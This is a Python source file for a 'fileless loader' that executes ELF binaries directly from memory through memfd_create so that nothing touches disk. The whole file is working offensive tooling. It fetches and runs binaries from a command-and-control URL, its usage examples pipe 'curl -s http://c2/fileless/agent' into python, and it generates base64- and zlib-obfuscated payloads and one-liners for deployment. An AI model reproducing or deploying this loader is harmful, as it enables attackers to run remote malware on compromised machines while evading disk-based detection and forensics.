#!/usr/bin/env python3
"""
6319 Fileless Loader
Execute ELF binaries from memory using memfd_create

Usage:
    # Local binary
    python3 memfd_loader.py /path/to/binary

    # From URL
    python3 memfd_loader.py http://c2/bin/agent

    # From stdin
    cat binary | python3 memfd_loader.py -

    # Embedded (generated)
    python3 <(curl -s http://c2/fileless/agent)
"""

import os
import sys
import ctypes
import base64
import zlib
import urllib.request


MFD_CLOEXEC = 1
MFD_ALLOW_SEALING = 2

SYSCALL_MEMFD_CREATE = {
    'x86_64': 319,
    'aarch64': 279,
    'arm': 385,
    'i386': 356,
    'i686': 356,
}


def get_syscall_number():
    """Get memfd_create syscall number for current architecture"""
    import platform
    arch = platform.machine()
    return SYSCALL_MEMFD_CREATE.get(arch, 319)


def memfd_create_native(name="", flags=MFD_CLOEXEC):
    """Create anonymous file using Python 3.8+ os.memfd_create"""
    try:
        return os.memfd_create(name, flags)
    except AttributeError:
        return None


def memfd_create_syscall(name="", flags=MFD_CLOEXEC):
    """Create anonymous file using raw syscall (fallback)"""
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        syscall_num = get_syscall_number()
        
        libc.syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_uint]
        libc.syscall.restype = ctypes.c_int
        
        fd = libc.syscall(syscall_num, name.encode() if name else b"", flags)
        
        if fd < 0:
            errno = ctypes.get_errno()
            raise OSError(errno, os.strerror(errno))
        
        return fd
    except Exception as e:
        return None


def memfd_create(name="", flags=MFD_CLOEXEC):
    """Create anonymous file descriptor in memory"""
    fd = memfd_create_native(name, flags)
    if fd is not None:
        return fd
    
    fd = memfd_create_syscall(name, flags)
    if fd is not None:
        return fd
    
    raise RuntimeError("memfd_create not available (requires Linux kernel 3.17+)")


def load_binary(source):
    """Load binary from file, URL, or stdin"""
    if source == '-':
        return sys.stdin.buffer.read()
    
    if source.startswith(('http://', 'https://')):
        req = urllib.request.Request(source)
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.read()
    
    with open(source, 'rb') as f:
        return f.read()


def execute_fileless(binary_data, argv=None, env=None, name=""):
    """Execute ELF binary from memory without touching disk"""
    
    if binary_data[:4] != b'\x7fELF':
        raise ValueError("Not a valid ELF binary")
    
    fd = memfd_create(name, MFD_CLOEXEC)
    
    os.write(fd, binary_data)
    
    fd_path = f"/proc/self/fd/{fd}"
    
    if argv is None:
        argv = [name or "a.out"]
    
    if env is None:
        env = dict(os.environ)
    
    os.execve(fd_path, argv, env)


def generate_payload(binary_path, compress=True):
    """Generate self-contained Python payload with embedded binary"""
    
    with open(binary_path, 'rb') as f:
        binary_data = f.read()
    
    if compress:
        compressed = zlib.compress(binary_data, 9)
        encoded = base64.b64encode(compressed).decode()
        decompress_code = "zlib.decompress(base64.b64decode(DATA))"
    else:
        encoded = base64.b64encode(binary_data).decode()
        decompress_code = "base64.b64decode(DATA)"
    
    payload = f'''#!/usr/bin/env python3
import os,sys,base64,zlib
DATA=b"{encoded}"
B={decompress_code}
fd=os.memfd_create("",1)
os.write(fd,B)
os.execve(f"/proc/self/fd/{{fd}}",sys.argv,dict(os.environ))
'''
    return payload


def generate_oneliner(binary_path):
    """Generate minimal one-liner payload"""
    
    with open(binary_path, 'rb') as f:
        binary_data = f.read()
    
    compressed = zlib.compress(binary_data, 9)
    encoded = base64.b64encode(compressed).decode()
    
    oneliner = f'python3 -c \'import os,sys,base64,zlib;B=zlib.decompress(base64.b64decode(b"{encoded}"));fd=os.memfd_create("",1);os.write(fd,B);os.execve(f"/proc/self/fd/{{fd}}",sys.argv,dict(os.environ))\''
    
    return oneliner


class FilelessRunner:
    """Helper class for fileless execution patterns"""
    
    def __init__(self, c2_url=None):
        self.c2_url = c2_url
    
    def run_from_url(self, url, argv=None):
        """Download and execute binary from URL"""
        binary = load_binary(url)
        execute_fileless(binary, argv)
    
    def run_embedded(self, data_b64, compressed=True, argv=None):
        """Execute embedded base64 binary"""
        binary = base64.b64decode(data_b64)
        if compressed:
            binary = zlib.decompress(binary)
        execute_fileless(binary, argv)
    
    def run_from_c2(self, binary_name, argv=None):
        """Download and execute from C2 server"""
        if not self.c2_url:
            raise ValueError("C2 URL not set")
        url = f"{self.c2_url}/bin/{binary_name}"
        self.run_from_url(url, argv)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary|url|->")
        print(f"       {sys.argv[0]} --generate <binary> [--oneliner]")
        sys.exit(1)
    
    if sys.argv[1] == '--generate':
        if len(sys.argv) < 3:
            print("Usage: --generate <binary> [--oneliner]")
            sys.exit(1)
        
        binary_path = sys.argv[2]
        
        if '--oneliner' in sys.argv:
            print(generate_oneliner(binary_path))
        else:
            print(generate_payload(binary_path))
        sys.exit(0)
    
    source = sys.argv[1]
    binary_data = load_binary(source)
    
    argv = sys.argv[1:] if len(sys.argv) > 1 else None
    
    execute_fileless(binary_data, argv)


if __name__ == '__main__':
    main()
